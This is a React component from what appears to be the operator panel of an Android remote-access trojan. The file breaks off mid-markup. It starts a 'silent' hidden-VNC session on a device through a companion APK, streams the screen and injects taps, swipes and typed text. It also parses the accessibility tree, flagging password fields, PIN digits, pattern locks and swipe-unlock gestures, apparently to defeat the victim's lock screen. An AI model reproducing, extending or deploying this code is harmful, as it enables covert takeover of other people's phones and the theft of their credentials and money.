/**
 * LiveScreen — HVNC + LY + V2 + DUPLO  (Professional Build)
 *
 * ── HVNC smooth control ────────────────────────────────────────────────────
 *   · Pointer Events API: setPointerCapture keeps drag locked to canvas even
 *     when pointer leaves bounds — no more lost swipes on fast gestures
 *   · Right-click → LONG_PRESS
 *   · Scroll wheel → short fast SWIPE (APK has no SCROLL cmd, swipe is equiv)
 *   · Keyboard passthrough: canvas focused → debounced TYPE accumulator
 *   · Overlay canvas: tap ripple + swipe preview arrow, pointer-events:none
 *   · 60fps dirty-flag RAF, GPU bitmap, alpha:false, desynchronized context
 *
 * ── LY (Layout Overlay) ───────────────────────────────────────────────────
 *   · HiDPI canvas, depth-based opacity, color-coded by node type
 *   · Hit-test → smallest containing node → TAP with real device px (raw path)
 *   · Free swipe on canvas → SWIPE with real device px
 *   · Selected node detail card with action buttons
 *   · Search filter highlights matching nodes in canvas
 *   · Zoom (1×/2×) via CSS transform
 *
 * ── Coordinate rules ──────────────────────────────────────────────────────
 *   VNC canvas touch/mouse → normalize 0-1 + scale:'vnc_norm'
 *   LY tap / node center   → real device px, no scale param (raw fallback)
 *   TYPE text              → performType via GestureCore, field injection
 */
import {
  useEffect, useLayoutEffect, useRef, useState, useCallback,
} from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

// ─── Constants ─────────────────────────────────────────────────────────────
const APK_W = 350;  // SILENT_WIDTH  in UiAssistBridge.java
const APK_H = 650;  // SILENT_HEIGHT

// ─── Hierarchy parser ──────────────────────────────────────────────────────
function apkRect(b) {
  if (!b) return null;
  const left   = b.left  ?? b.x  ?? 0;
  const top    = b.top   ?? b.y  ?? 0;
  const right  = b.right  ?? left + (b.w ?? 0);
  const bottom = b.bottom ?? top  + (b.h ?? 0);
  return { left, top, right, bottom };
}

function walkNode(raw, depth, out) {
  if (!raw || depth > 30) return;
  const text   = raw.text || raw.desc || raw.contentDescription || '';
  const bounds = apkRect(raw.bounds);
  const valid  = bounds && bounds.right - bounds.left > 0;
  if (text || valid) {
    out.push({
      text:          text.trim(),
      cls:           raw.class || raw.className || '',
      pkg:           raw.pkg || raw.packageName || raw.windowPackage || '',
      clickable:     !!raw.clickable,
      enabled:       raw.enabled !== false,
      checked:       !!raw.checked,
      focused:       !!raw.focused,
      scrollable:    !!raw.scrollable,
      editable:      !!raw.editable,
      password:      !!raw.password,
      longClickable: !!raw.longClickable,
      bounds, depth,
      id:            raw.id || raw.viewIdResourceName || '',
      isKeyboard:    !!(raw.isKeyboard || raw.isKeyboardKey),
      keyType:       raw.keyType || null,
      isPinDigit:    !!raw.isPinDigit,
      isPatternLock: !!raw.isPatternLock,
      isSwipeUnlock: !!raw.isSwipeUnlock,
      patternGrid:   raw.patternGrid || null,
      swipeHint:     raw.swipeHint   || null,
      hint:          raw.hint        || '',
    });
  }
  for (const c of (raw.children || [])) walkNode(c, depth + 1, out);
}

function parseHierarchy(raw) {
  const out = [];
  try {
    const p    = typeof raw === 'string' ? JSON.parse(raw) : raw;
    const root = p?.hierarchy ?? p;
    for (const r of (Array.isArray(root) ? root : [root])) walkNode(r, 0, out);
  } catch (_) {}
  return out;
}

function extractLines(nodes) {
  const tx = nodes.filter(n => n.text).sort((a, b) => {
    const ay = a.bounds ? (a.bounds.top  + a.bounds.bottom) / 2 : 0;
    const by = b.bounds ? (b.bounds.top  + b.bounds.bottom) / 2 : 0;
    return ay - by;
  });
  const rows = []; let row = [], lastY = -Infinity;
  for (const n of tx) {
    const y = n.bounds ? (n.bounds.top + n.bounds.bottom) / 2 : lastY + 40;
    if (Math.abs(y - lastY) > 22 && row.length) {
      rows.push([...row].sort((a, b) => (a.bounds?.left ?? 0) - (b.bounds?.left ?? 0)));
      row = [];
    }
    row.push(n); lastY = y;
  }
  if (row.length) rows.push(row);
  return rows;
}

const bCenter = b => b
  ? { x: Math.round((b.left + b.right) / 2), y: Math.round((b.top + b.bottom) / 2) }
  : null;

// ─── Node color palette ────────────────────────────────────────────────────
function nodeColor(n) {
  if (!n.enabled)      return '#475569';
  if (n.focused)       return '#f8fafc';
  if (n.isPinDigit)    return '#60a5fa';
  if (n.isPatternLock) return '#818cf8';
  if (n.password)      return '#f87171';
  if (n.isKeyboard)    return '#c084fc';
  if (n.editable)      return '#34d399';
  if (n.scrollable)    return '#4ade80';
  if (n.clickable)     return '#fbbf24';
  return '#475569';
}

// ─── LY: draw layout canvas ────────────────────────────────────────────────
function drawLY(canvas, nodes, options = {}) {
  if (!canvas || !nodes.length) return null;
  const ctx = canvas.getContext('2d', { alpha: false });
  if (!ctx) return null;

  const { highlight, searchTerm, showLabels = true } = options;

  // Infer screen bounds from node data
  let maxX = 0, maxY = 0;
  for (const n of nodes) {
    if (!n.bounds) continue;
    if (n.bounds.right  > maxX) maxX = n.bounds.right;
    if (n.bounds.bottom > maxY) maxY = n.bounds.bottom;
  }
  if (!maxX || !maxY) return null;

  const dpr  = Math.min(window.devicePixelRatio || 1, 3);
  const logW = canvas.clientWidth || APK_W;
  const logH = Math.round(logW * maxY / maxX);

  if (canvas.width !== logW * dpr || canvas.height !== logH * dpr) {
    canvas.width  = logW * dpr;
    canvas.height = logH * dpr;
    canvas.style.height = logH + 'px';
  }

  const sx = (logW * dpr) / maxX;
  const sy = (logH * dpr) / maxY;

  // ── Background ──
  ctx.fillStyle = '#060810';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Subtle grid
  ctx.strokeStyle = 'rgba(255,255,255,0.025)';
  ctx.lineWidth = 1;
  const gs = Math.round(maxX / 6) * sx;
  for (let x = gs; x < canvas.width; x += gs) {
    ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
  }
  for (let y = gs; y < canvas.height; y += gs) {
    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
  }

  // ── Sort large→small so small nodes render on top ──
  const sorted = [...nodes].filter(n => n.bounds).sort((a, b) => {
    const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
    const bA = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
    return bA - aA;
  });

  const fs    = Math.round(9.5 * dpr);
  const fsMed = Math.round(8   * dpr);
  ctx.textBaseline = 'top';

  const hasSearch = searchTerm && searchTerm.length > 0;

  for (const n of sorted) {
    const { left, top, right, bottom } = n.bounds;
    const x = left   * sx, y = top   * sy;
    const w = (right - left) * sx, h = (bottom - top) * sy;
    if (w < 1 || h < 1) continue;

    const col   = nodeColor(n);
    const isHit = highlight && highlight === n;
    const isMatch = hasSearch && (
      n.text?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      n.cls.toLowerCase().includes(searchTerm.toLowerCase())
    );
    const dimmed = hasSearch && !isMatch && !isHit;

    // Depth-based base alpha (deeper = more faint background)
    const depthAlpha = Math.max(0.3, 1 - n.depth * 0.06);

    const baseAlpha = dimmed ? 0.12 : (isHit ? 1 : (isMatch ? 0.95 : depthAlpha));
    const fillAlpha = isHit ? 0.22 : (isMatch ? 0.10 : (dimmed ? 0.02 : 0.05));

    if (w > 6 && h > 6) {
      ctx.globalAlpha = fillAlpha;
      ctx.fillStyle   = isHit ? '#ffffff' : col;
      ctx.fillRect(x, y, w, h);
    }

    ctx.globalAlpha = baseAlpha;
    ctx.strokeStyle = isHit ? '#ffffff' : (isMatch ? '#fff' : col);
    ctx.lineWidth   = isHit
      ? 2.5 * dpr
      : (n.focused ? 2 * dpr : (n.clickable || isMatch ? 1.5 * dpr : 0.8 * dpr));
    ctx.strokeRect(x + 0.5, y + 0.5, w - 1, h - 1);
    ctx.globalAlpha = 1;

    // ── Label ──
    if (!showLabels) continue;
    const label = n.text || (n.cls ? n.cls.split('.').pop() : '');
    if (!label || h < fsMed * 1.3 || w < 12) continue;
    const renderFs = Math.min(fs, h * 0.35);
    ctx.font        = `${Math.round(renderFs)}px 'SF Mono','Roboto Mono',monospace`;
    ctx.fillStyle   = isHit ? '#ffffff' : col;
    ctx.globalAlpha = baseAlpha * 0.9;
    let txt = label;
    while (txt.length > 1 && ctx.measureText(txt).width > w - 4 * dpr) txt = txt.slice(0, -1);
    if (txt !== label) txt += '…';
    ctx.fillText(txt, x + 2 * dpr, y + 2 * dpr);
    ctx.globalAlpha = 1;
  }

  // ── Focused node corner brackets ──
  for (const n of sorted.filter(nd => nd.focused)) {
    const { left, top, right, bottom } = n.bounds;
    const x = left * sx, y = top * sy;
    const w = (right - left) * sx, h = (bottom - top) * sy;
    const m = Math.min(w * 0.25, h * 0.25, 14 * dpr);
    ctx.strokeStyle = '#ffffff'; ctx.lineWidth = 2 * dpr; ctx.globalAlpha = 0.9;
    [[x, y], [x + w, y], [x, y + h], [x + w, y + h]].forEach(([cx, cy], i) => {
      const dx = i < 2 ? 1 : -1, dy = i % 2 === 0 ? 1 : -1;
      ctx.beginPath();
      ctx.moveTo(cx + dx * m, cy); ctx.lineTo(cx, cy); ctx.lineTo(cx, cy + dy * m);
      ctx.stroke();
    });
    ctx.globalAlpha = 1;
  }

  return { sx, sy, logW, logH, maxX, maxY, dpr };
}

// ─── LY hit test ──────────────────────────────────────────────────────────
function hitTest(cssPxX, cssPxY, canvas, scale, nodes) {
  if (!scale || !canvas) return null;
  const r    = canvas.getBoundingClientRect();
  const devX = ((cssPxX - r.left) / r.width)  * scale.maxX;
  const devY = ((cssPxY - r.top)  / r.height) * scale.maxY;
  return nodes
    .filter(n => n.bounds &&
      devX >= n.bounds.left && devX <= n.bounds.right &&
      devY >= n.bounds.top  && devY <= n.bounds.bottom)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const bA = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aA - bA;
    })[0] ?? null;
}

function cssToDevice(cssPxX, cssPxY, canvas, scale) {
  if (!scale || !canvas) return { x: 0, y: 0 };
  const r = canvas.getBoundingClientRect();
  return {
    x: Math.round(((cssPxX - r.left) / r.width)  * scale.maxX),
    y: Math.round(((cssPxY - r.top)  / r.height) * scale.maxY),
  };
}

// ─── Overlay: tap ripple ───────────────────────────────────────────────────
function playRipple(canvas, normX, normY, color = '#ffffff') {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  const px = normX * W, py = normY * H;
  let r = 4, maxR = 28, al = 0.75;
  const frame = () => {
    ctx.clearRect(0, 0, W, H);
    ctx.beginPath();
    ctx.arc(px, py, r, 0, Math.PI * 2);
    ctx.strokeStyle = color.replace(')', `,${al})`).replace('rgb', 'rgba');
    ctx.lineWidth = 2.5;
    ctx.stroke();
    r += 2.8; al -= 0.05;
    if (r < maxR) requestAnimationFrame(frame);
    else ctx.clearRect(0, 0, W, H);
  };
  requestAnimationFrame(frame);
}

// ─── Overlay: swipe preview ────────────────────────────────────────────────
function drawSwipePreview(canvas, x1n, y1n, x2n, y2n) {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  ctx.clearRect(0, 0, W, H);
  const sx = x1n * W, sy = y1n * H;
  const ex = x2n * W, ey = y2n * H;
  const ang = Math.atan2(ey - sy, ex - sx);
  // Dashed line
  ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(ex, ey);
  ctx.strokeStyle = 'rgba(255,255,255,0.55)';
  ctx.lineWidth   = 2;
  ctx.setLineDash([5, 5]); ctx.stroke(); ctx.setLineDash([]);
  // Start dot
  ctx.beginPath(); ctx.arc(sx, sy, 4.5, 0, Math.PI * 2);
  ctx.fillStyle = 'rgba(255,255,255,0.8)'; ctx.fill();
  // Arrowhead
  const al = 13;
  ctx.beginPath();
  ctx.moveTo(ex, ey);
  ctx.lineTo(ex - al * Math.cos(ang - 0.38), ey - al * Math.sin(ang - 0.38));
  ctx.lineTo(ex - al * Math.cos(ang + 0.38), ey - al * Math.sin(ang + 0.38));
  ctx.closePath();
  ctx.fillStyle = 'rgba(255,255,255,0.8)'; ctx.fill();
}

function clearOverlay(canvas) {
  if (!canvas) return;
  canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height);
}

// ─── Quality indicator ─────────────────────────────────────────────────────
function quality(fps, lat) {
  if (fps >= 25 && lat < 120) return { label: 'EXCELENTE', col: '#4ade80', bars: 5 };
  if (fps >= 15 && lat < 300) return { label: 'BOM',       col: '#a3e635', bars: 4 };
  if (fps >= 8  && lat < 600) return { label: 'MÉDIO',     col: '#facc15', bars: 3 };
  if (fps >= 2)               return { label: 'FRACO',     col: '#fb923c', bars: 2 };
  return                             { label: 'SEM SINAL', col: '#f87171', bars: 1 };
}

// ─── Component ────────────────────────────────────────────────────────────
const MODES = [
  { id: 'HVNC', label: '🖥 HVNC' },
  { id: 'LY',   label: '◻ LY'   },
  { id: 'V2',   label: '🔓 V2'  },
  { id: 'DUPLO', label: '⧉ DUPLO' },
];

export default function LiveScreen({ deviceId, onBack, sendCmd }) {
  // ── VNC refs ──────────────────────────────────────────────────────────
  const canvasRef   = useRef(null);   // VNC stream canvas
  const overlayRef  = useRef(null);   // tap ripple + swipe preview
  const ctxRef      = useRef(null);
  const bitmapRef   = useRef(null);
  const dirtyRef    = useRef(false);
  const rafRef      = useRef(null);
  const fpsDecRef   = useRef(0);
  const latRef      = useRef(performance.now());
  // Pointer capture
  const ptrRef      = useRef(null);   // { x, y, ts, pointerId, button, normX, normY }
  // Keyboard passthrough
  const kbBufRef    = useRef('');
  const kbTimerRef  = useRef(null);

  // ── LY refs ───────────────────────────────────────────────────────────
  const lyCanvasRef = useRef(null);
  const lyScaleRef  = useRef(null);
  const lyTRef      = useRef(null);
  const lyMRef      = useRef(null);
  const autoRef     = useRef(null);
  const ocrRef      = useRef(null);

  const setVnc = useStore(s => s.setVncActive);

  // ── State ─────────────────────────────────────────────────────────────
  const [mode, setMode]         = useState('HVNC');
  const [vncQual, setVncQual]   = useState(60);
  const [fps, setFps]           = useState(0);
  const [latMs, setLatMs]       = useState(0);
  const [vncOn, setVncOn]       = useState(false);

  const [nodes, setNodes]         = useState([]);
  const [lines, setLines]         = useState([]);
  const [rawData, setRawData]     = useState('');
  const [srTab, setSrTab]         = useState('ocr');
  const [filter, setFilter]       = useState('');
  const [toast, setToast]         = useState(null);
  const [toastCol, setToastCol]   = useState('#4ade80');
  const [srTs, setSrTs]           = useState(null);
  const [srPkg, setSrPkg]         = useState('');
  const [liveMode, setLiveMode]   = useState(false);
  const [typeText, setTypeText]   = useState('');
  const [tapX, setTapX]           = useState('');
  const [tapY, setTapY]           = useState('');

  // LY state
  const [lyHighlight, setLyHighlight]   = useState(null);
  const [lySelected, setLySelected]     = useState(null);
  const [lySearch, setLySearch]         = useState('');
  const [lyZoom, setLyZoom]             = useState(1);
  const [showLabels, setShowLabels]     = useState(true);
  const [lyScreenRes, setLyScreenRes]   = useState(null);

  // ── VNC: context (alpha:false skips compositing, desync detaches vsync) ──
  function getCtx() {
    if (ctxRef.current) return ctxRef.current;
    const c = canvasRef.current; if (!c) return null;
    ctxRef.current = c.getContext('2d', { alpha: false, desynchronized: true });
    if (ctxRef.current) ctxRef.current.imageSmoothingEnabled = false;
    return ctxRef.current;
  }

  // ── VNC: RAF loop — only draws on new frame (dirty flag) ─────────────
  useEffect(() => {
    function loop() {
      if (dirtyRef.current) {
        const bmp = bitmapRef.current;
        const ctx = getCtx();
        if (bmp && ctx) ctx.drawImage(bmp, 0, 0);
        dirtyRef.current = false;
      }
      rafRef.current = requestAnimationFrame(loop);
    }
    rafRef.current = requestAnimationFrame(loop);
    return () => {
      cancelAnimationFrame(rafRef.current);
      bitmapRef.current?.close?.();
    };
  }, []);

  // Sync overlay canvas size with VNC canvas
  useEffect(() => {
    const ov = overlayRef.current;
    const vc = canvasRef.current;
    if (!ov || !vc) return;
    ov.width  = vc.width;
    ov.height = vc.height;
  }, []);

  // ── VNC: binary frame pipeline ─────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const now = performance.now();
      setLatMs(Math.round(now - latRef.current));
      latRef.current = now;
      fpsDecRef.current++;
      // createImageBitmap: GPU decode, async, never blocks main thread
      createImageBitmap(new Blob([buf], { type: 'image/jpeg' })).then(bmp => {
        bitmapRef.current?.close?.();
        bitmapRef.current = bmp;
        dirtyRef.current  = true;
      }).catch(() => {});
    });
    const t = setInterval(() => { setFps(fpsDecRef.current); fpsDecRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(t); };
  }, [deviceId]);

  // ── Hierarchy + VNC status messages ───────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;
      if (msg.type === 'screen_hierarchy') {
        const raw = msg.data || '{}';
        try {
          const p  = typeof raw === 'string' ? JSON.parse(raw) : raw;
          setSrPkg(p.package || '');
          const n  = parseHierarchy(raw);
          const l  = extractLines(n);
          setNodes(n); setLines(l);
          setRawData(typeof raw === 'string' ? raw : JSON.stringify(raw, null, 2));
          setSrTs(msg.ts);
          // Infer screen resolution
          let rx = 0, ry = 0;
          for (const nd of n) {
            if (!nd.bounds) continue;
            if (nd.bounds.right  > rx) rx = nd.bounds.right;
            if (nd.bounds.bottom > ry) ry = nd.bounds.bottom;
          }
          if (rx && ry) setLyScreenRes({ w: rx, h: ry });
          toast2('REQUEST_HIERARCHY', '#4ade80');
          setTimeout(() => ocrRef.current?.scrollTo({ top: 0, behavior: 'smooth' }), 40);
        } catch (_) {}
      }
      if (msg.type === 'vnc_status') { setVncOn(!!msg.active); setVnc(!!msg.active); }
    });
    return unsub;
  }, [deviceId]);

  // ── LY: redraw on node or option change ────────────────────────────────
  useLayoutEffect(() => {
    if (!lyCanvasRef.current || !nodes.length) return;
    lyScaleRef.current = drawLY(lyCanvasRef.current, nodes, {
      highlight: lyHighlight, searchTerm: lySearch, showLabels,
    });
  }, [nodes, lyHighlight, lySearch, showLabels, mode]);

  const lyRefCb = useCallback(node => {
    lyCanvasRef.current = node;
    if (node && nodes.length) {
      lyScaleRef.current = drawLY(node, nodes, {
        highlight: lyHighlight, searchTerm: lySearch, showLabels,
      });
    }
  }, [nodes, lyHighlight, lySearch, showLabels]);

  // ── Live hierarchy polling ─────────────────────────────────────────────
  useEffect(() => {
    clearInterval(autoRef.current);
    if (liveMode) {
      sendCmd('REQUEST_HIERARCHY');
      autoRef.current = setInterval(() => sendCmd('REQUEST_HIERARCHY'), 500);
    }
    return () => clearInterval(autoRef.current);
  }, [liveMode, sendCmd]);

  // ── VNC controls ──────────────────────────────────────────────────────
  function startVnc() { sendCmd('START_SILENT_VNC'); ws.subscribe('vnc', deviceId); setVncOn(true); setVnc(true); }
  function stopVnc()  { sendCmd('STOP_SILENT_VNC');  ws.unsubscribe('vnc', deviceId); setVncOn(false); setVnc(false); }
  function handleBack() { stopVnc(); setLiveMode(false); onBack(); }

  function toast2(m, col = '#4ade80') { setToast(m); setToastCol(col); setTimeout(() => setToast(null), 2000); }

  // ── VNC: normalize coords → 0-1 (APK vnc_norm mode) ──────────────────
  const normCoords = useCallback((clientX, clientY) => {
    const c = canvasRef.current; if (!c) return { x: 0.5, y: 0.5 };
    const r = c.getBoundingClientRect();
    return {
      x: Math.max(0.001, Math.min(0.999, (clientX - r.left) / r.width)),
      y: Math.max(0.001, Math.min(0.999, (clientY - r.top)  / r.height)),
    };
  }, []);

  // ── VNC: Pointer Events (replaces mouse+touch) ─────────────────────────
  // setPointerCapture: drag stays locked even if pointer leaves canvas bounds
  const onPtrDown = useCallback(e => {
    if (e.button === 1) return; // ignore middle-click
    e.preventDefault();
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch (_) {}
    const { x, y } = normCoords(e.clientX, e.clientY);
    ptrRef.current = {
      clientX: e.clientX, clientY: e.clientY,
      normX: x, normY: y,
      ts: Date.now(), pointerId: e.pointerId, button: e.button,
    };
  }, [normCoords]);

  const onPtrMove = useCallback(e => {
    if (!ptrRef.current || ptrRef.current.pointerId !== e.pointerId) return;
    const dist = Math.hypot(e.clientX - ptrRef.current.clientX, e.clientY - ptrRef.current.clientY);
    // Draw swipe preview when drag starts
    if (dist > 10) {
      const { x: ex, y: ey } = normCoords(e.clientX, e.clientY);
      drawSwipePreview(overlayRef.current, ptrRef.current.normX, ptrRef.current.normY, ex, ey);
    }
  }, [normCoords]);

  const onPtrUp = useCallback(e => {
    const p = ptrRef.current;
    if (!p || p.pointerId !== e.pointerId) return;
    ptrRef.current = null;
    clearOverlay(overlayRef.current);

    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const dt   = Date.now() - p.ts;
    const { x: sx, y: sy } = { x: p.normX, y: p.normY };

    if (p.button === 2 || (dist < 14 && dt > 550)) {
      // Right-click or long-hold → LONG_PRESS
      sendCmd('LONG_PRESS', { x: sx, y: sy, scale: 'vnc_norm', duration: 800 });
      playRipple(overlayRef.current, sx, sy, '#c084fc');
      toast2('LONG PRESS', '#c084fc');
    } else if (dist < 14) {
      // Tap
      sendCmd('TAP', { x: sx, y: sy, scale: 'vnc_norm' });
      playRipple(overlayRef.current, sx, sy, '#fbbf24');
    } else {
      // Swipe
      const { x: ex, y: ey } = normCoords(e.clientX, e.clientY);
      sendCmd('SWIPE', { x1: sx, y1: sy, x2: ex, y2: ey, scale: 'vnc_norm', duration: dt });
      // No toast for swipe — avoid flicker
    }
  }, [sendCmd, normCoords]);

  // Right-click context menu suppression
  const onCtxMenu = useCallback(e => e.preventDefault(), []);

  // ── VNC: scroll wheel → fast short swipe ────────────────────────────
  // APK has no SCROLL command; short fast SWIPE on scrollable view works
  const onWheel = useCallback(e => {
    e.preventDefault();
    const { x, y } = normCoords(e.clientX, e.clientY);
    const d  = e.deltaY > 0 ? 0.22 : -0.22; // scroll distance (normalized)
    const ny = Math.max(0.01, Math.min(0.99, y + d));
    sendCmd('SWIPE', { x1: x, y1: y, x2: x, y2: ny, scale: 'vnc_norm', duration: 120 });
  }, [sendCmd, normCoords]);

  // ── VNC: keyboard passthrough ─────────────────────────────────────────
  // Buffer keystrokes → debounced TYPE every 150ms (TYPE does field injection)
  const flushKb = useCallback(() => {
    if (!kbBufRef.current) return;
    sendCmd('TYPE', { text: kbBufRef.current });
    kbBufRef.current = '';
  }, [sendCmd]);

  const onKbDown = useCallback(e => {
    if (!vncOn) return;
    if (e.ctrlKey || e.altKey || e.metaKey) return;
    if (e.key === 'Escape') { e.preventDefault(); return; }
    if (e.key === 'Enter') {
      e.preventDefault();
      clearTimeout(kbTimerRef.current);
      flushKb();
      setTimeout(() => sendCmd('KEY', { action: 'ENTER' }), 60);
      return;
    }
    if (e.key === 'Backspace') {
      e.preventDefault();
      clearTimeout(kbTimerRef.current);
      kbBufRef.current = kbBufRef.current.slice(0, -1);
      if (!kbBufRef.current) sendCmd('KEY', { action: 'BACK' });
      return;
    }
    if (e.key.length === 1) {
      e.preventDefault();
      kbBufRef.current += e.key;
      clearTimeout(kbTimerRef.current);
      kbTimerRef.current = setTimeout(flushKb, 150);
    }
  }, [vncOn, sendCmd, flushKb]);

  // ── LY: pointer interactions ───────────────────────────────────────────
  const onLyPtrDown = useCallback(e => {
    e.preventDefault();
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch (_) {}
    lyTRef.current = { clientX: e.clientX, clientY: e.clientY, ts: Date.now(), pointerId: e.pointerId };
  }, []);

  const onLyPtrUp = useCallback(e => {
    const p = lyTRef.current;
    if (!p || p.pointerId !== e.pointerId) return;
    lyTRef.current = null;

    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const dt   = Date.now() - p.ts;
    const c    = lyCanvasRef.current;
    const sc   = lyScaleRef.current;

    if (dist < 14) {
      const hit = hitTest(p.clientX, p.clientY, c, sc, nodes);
      if (hit) {
        const center = bCenter(hit.bounds);
        if (center) {
          setLyHighlight(hit);
          setLySelected(hit);
          setTimeout(() => setLyHighlight(null), 450);
          sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: center.x, y: center.y });
          const lbl = hit.text || hit.cls.split('.').pop();
          toast2(`${dt > 600 ? 'HOLD' : 'TAP'} → ${lbl.slice(0, 26)}`, nodeColor(hit));
        }
      } else {
        const dev = cssToDevice(p.clientX, p.clientY, c, sc);
        sendCmd('TAP', { x: dev.x, y: dev.y });
        toast2(`TAP (${dev.x}, ${dev.y})`, '#94a3b8');
      }
    } else {
      const s   = cssToDevice(p.clientX, p.clientY, c, sc);
      const end = cssToDevice(e.clientX, e.clientY, c, sc);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: end.x, y2: end.y, duration: dt });
      toast2(`SWIPE (${s.x},${s.y})→(${end.x},${end.y})`, '#34d399');
    }
  }, [sendCmd, nodes]);

  // Node tap from V2 lists — bounds are real device px → raw path
  function tapNode(n) {
    const c = bCenter(n.bounds);
    if (c) { sendCmd('TAP', { x: c.x, y: c.y }); toast2(`TAP → ${n.text || n.cls.split('.').pop()}`, nodeColor(n)); }
  }

  const filteredNodes = filter
    ? nodes.filter(n =>
        n.text?.toLowerCase().includes(filter.toLowerCase()) ||
        n.cls?.toLowerCase().includes(filter.toLowerCase()) ||
        n.id?.toLowerCase().includes(filter.toLowerCase()))
    : nodes;

  const qual       = quality(fps, latMs);
  const showVnc    = mode === 'HVNC' || mode === 'DUPLO';
  const showLy     = mode === 'LY'   || mode === 'DUPLO';
  const showReader = mode === 'V2'   || mode === 'DUPLO';

  // ─────────────────────────────────────────────────────────────────────
  return (
    <div className="fade-up">

      {/* ── Toast ── */}
      {toast && (
        <div style={{
          position: 'fixed', top: 68, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(6,4,12,.97)',
          border: `1px solid ${toastCol}44`,
          borderRadius: 8, padding: '6px 14px', zIndex: 9999,
          maxWidth: '84vw', pointerEvents: 'none',
          boxShadow: `0 0 20px ${toastCol}22`,
        }}>
          <span style={{ color: toastCol, fontSize: 11, fontWeight: 700 }}>{toast}</span>
        </div>
      )}

      {/* ── Toolbar ── */}
      <div className="row-sb mb6">
        <div>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: .5 }}>
            EDITAR V2 ✏
          </div>
          <div className="row gap5 mt3">
            <span style={{ fontSize: 10, color: 'var(--text3)' }}>OCR</span>
            <span style={{ fontSize: 10, color: '#4ade80', fontWeight: 700 }}>⚡</span>
            <span style={{ fontSize: 10, fontWeight: 700,
              color: nodes.filter(n => n.text).length ? '#4ade80' : 'var(--text3)' }}>
              {nodes.filter(n => n.text).length > 0
                ? `${Math.min(99, nodes.filter(n => n.text).length)}%` : '—'}
            </span>
            {srPkg && (
              <span style={{ fontSize: 10, color: 'var(--text3)' }}>
                {srPkg.split('.').slice(-1)[0]}
              </span>
            )}
          </div>
        </div>
        <div className="row gap4">
          {MODES.map(m => (
            <button key={m.id}
              onClick={() => { setMode(m.id); if (m.id !== 'HVNC') sendCmd('REQUEST_HIERARCHY'); }}
              className={`btn btn-sm ${mode === m.id ? 'btn-blue' : 'btn-ghost'}`}
              style={{ padding: '4px 8px', fontSize: 11, fontWeight: 700 }}>
              {m.label}
            </button>
          ))}
          <button className="btn btn-ghost btn-sm" style={{ padding: '4px 8px', fontSize: 11 }}
            onClick={handleBack}>←</button>
        </div>
      </div>

      {/* ── Status bar ── */}
      <div className="row gap5 mb8" style={{ flexWrap: 'wrap' }}>
        {/* Connection quality */}
        <span style={{
          display: 'flex', alignItems: 'center', gap: 4,
          background: 'rgba(0,0,0,.35)', borderRadius: 12,
          padding: '3px 8px', border: `1px solid ${qual.col}33`,
        }}>
          <span style={{ display: 'flex', gap: 2 }}>
            {[1,2,3,4,5].map(i => (
              <span key={i} style={{
                width: 3, height: 8 + i * 1.5, background: i <= qual.bars ? qual.col : '#334155',
                borderRadius: 1, display: 'block',
              }} />
            ))}
          </span>
          <span style={{ fontSize: 10, color: qual.col, fontWeight: 700 }}>{qual.label}</span>
        </span>
        <span className={`pill ${vncOn ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 10 }}>
          {vncOn ? `${fps} FPS · ${latMs}ms` : 'OFF'}
        </span>
        {lyScreenRes && (
          <span className="pill pill-dim" style={{ fontSize: 10 }}>
            {lyScreenRes.w}×{lyScreenRes.h}
          </span>
        )}
        {nodes.length > 0 && (
          <span className="pill pill-gold" style={{ fontSize: 10 }}>
            {nodes.filter(n => n.text).length} nodes
          </span>
        )}
        {liveMode && <span className="pill pill-red" style={{ fontSize: 10 }}>🔴 LIVE</span>}
      </div>

      {/* ══════════════════════════════════════════
          HVNC CANVAS
      ══════════════════════════════════════════ */}
      {showVnc && (
        <>
          {/* VNC HUD bar */}
          <div style={{
            display: 'flex', alignItems: 'center', gap: 8,
            padding: '5px 10px', borderRadius: '8px 8px 0 0',
            background: 'rgba(6,4,14,.95)',
            border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none',
          }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#60a5fa', letterSpacing: 1 }}>HVNC</span>
            <span style={{ width: 1, height: 12, background: 'rgba(255,255,255,.12)' }} />
            <span style={{ fontSize: 10, color: vncOn ? '#4ade80' : '#475569', fontWeight: 700 }}>
              {vncOn ? `${fps} FPS` : 'PARADO'}
            </span>
            <span style={{ fontSize: 10, color: 'var(--text3)' }}>{latMs}ms</span>
            <span style={{ marginLeft: 'auto', fontSize: 10, color: 'var(--text3)' }}>
              {APK_W}×{APK_H} · clique, segurar, arrastar, rolar
            </span>
          </div>

          {/* Canvas wrapper: pointer events, keyboard passthrough, wheel */}
          <div
            tabIndex={0}
            onKeyDown={onKbDown}
            style={{ outline: 'none', position: 'relative', touchAction: 'none' }}
          >
            <canvas
              ref={canvasRef}
